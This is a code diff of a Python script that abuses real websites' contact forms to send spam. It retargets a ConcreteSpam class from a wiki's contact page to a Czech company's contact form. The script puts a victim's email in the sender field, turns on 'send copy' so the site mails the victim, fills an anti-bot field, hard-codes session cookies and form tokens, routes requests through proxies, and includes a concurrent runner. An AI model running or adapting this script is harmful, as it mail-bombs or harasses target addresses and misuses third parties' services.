@@ -8,14 +8,8 @@ from module import Spam
 class ConcreteSpam(Spam):
 
     def post(self, target) -> requests.Response | None:
-        import requests
-
         cookies = {
-            '_gid': 'GA1.2.628328214.1678093169',
-            'wikh_share_db_wiki_mwuser-sessionId': '80beed7dc55401cca9b7',
-            '_ga_DMBHXB1QVZ': 'GS1.1.1678093166.1.1.1678093681.0.0.0',
-            '_ga': 'GA1.2.398774296.1678093167',
-            '_gat': '1',
+            'PHPSESSID': 'fl6o5hgm97vs91mi4mlda7hhq72uohd4nek851p8avqh3l2smne1',
         }
 
         headers = {
@@ -23,9 +17,9 @@ class ConcreteSpam(Spam):
             'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
             'Cache-Control': 'no-cache',
             'Connection': 'keep-alive',
-            'Origin': 'https://en.wikihussain.com',
+            'Origin': 'https://services.vspdata.cz',
             'Pragma': 'no-cache',
-            'Referer': 'https://en.wikihussain.com/view/Special:Contact',
+            'Referer': 'https://services.vspdata.cz/de/contact/',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-Site': 'same-origin',
@@ -37,29 +31,31 @@ class ConcreteSpam(Spam):
             'sec-ch-ua-platform': '"Windows"',
         }
 
-        text = self.get_text()
+        text = self.get_text(False)
         data = {
-            'title': 'Special:Contact',
-            'wpFromName': text,
-            'wpFromAddress': target,
-            'wpSubject': text,
-            'wpText': text,
-            'wpCCme': '1',
-            'wpEditToken': '+\\',
-            'wpFormType': '',
+            'to': 'aik',
+            'name': 'text',
+            'mail': target,
+            'subject': 'text',
+            'message': 'text',
+            'antibot': 'notabot',
+            'sendCopy': 'on',
+            'send': 'SENDEN',
+            '_token_': 'cx9d3sh23hZHUZukMuy5WUnZjm9rcHnxt5NfU=',
+            '_do': 'contactForm-submit',
         }
 
-        response = requests.post('https://en.wikihussain.com/view/Special:Contact', cookies=cookies, headers=headers,
-                                 data=data, proxies=self.get_proxies(), timeout=20)
+        response = requests.post('https://services.vspdata.cz/de/contact/', cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
         return response
 
 
 def main():
-    s = 'Your email message has been sent.'
+    s = 'Vielen Dank'
+
     spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
     res = spam.send_post()
-    if res:
-        spam.run_concurrently(50)
+    # if res:
+    #     spam.run_concurrently()
 
 
 if __name__ == '__main__':
